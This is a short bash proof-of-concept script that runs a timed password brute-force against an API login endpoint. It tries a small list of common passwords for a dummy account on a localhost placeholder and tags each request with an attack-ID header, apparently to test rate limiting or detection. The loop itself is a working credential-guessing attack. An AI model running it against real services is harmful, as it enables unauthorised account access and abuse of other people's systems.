#!/usr/bin/env bash
# poc_bruteforce.sh
# Usage: ./poc_bruteforce.sh
API_GATEWAY="http://localhost:8080/api"   # <-- replace this
ATTACK_ID="POC-AUTH-001"
WORDLIST="small_pwlist.txt"

cat > $WORDLIST <<'WL'
password
123456
admin
letmein
password1
WL

END=$((SECONDS+35))
echo "Starting small brute-force for 30s, attack id=$ATTACK_ID"
while [ $SECONDS -lt $END ]; do
  for pw in $(cat $WORDLIST); do
    curl -s -X POST "${API_GATEWAY}/auth/login" \
      -H "X-ATTACK-ID: $ATTACK_ID" \
      -H "User-Agent: poc-agent" \
      -H "Content-Type: application/json" \
      -d "{\"email\":\"invalid@test.com\",\"password\":\"$pw\"}" > /dev/null &
    sleep 0.07
  done
done
wait
echo "Done."
